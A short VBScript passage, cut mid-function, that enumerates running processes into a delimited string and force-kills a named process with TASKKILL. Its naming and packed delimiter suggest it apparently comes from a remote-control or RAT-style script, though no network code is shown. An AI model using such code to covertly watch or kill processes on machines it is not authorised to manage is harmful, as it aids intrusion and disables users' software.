Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process")

For Each objProcess in colProcess

    strList = strList &  objProcess.Name & "#" & objProcess.processid  & "#"  & objProcess.executablepath  & "PrO_SPL"

Next
enumprocess = strList
    End Function
    Sub exitprocess(pname)
        On Error Resume Next
		shellobj.run("TASKKILL /F /IM " & pname)
End Sub
		
		





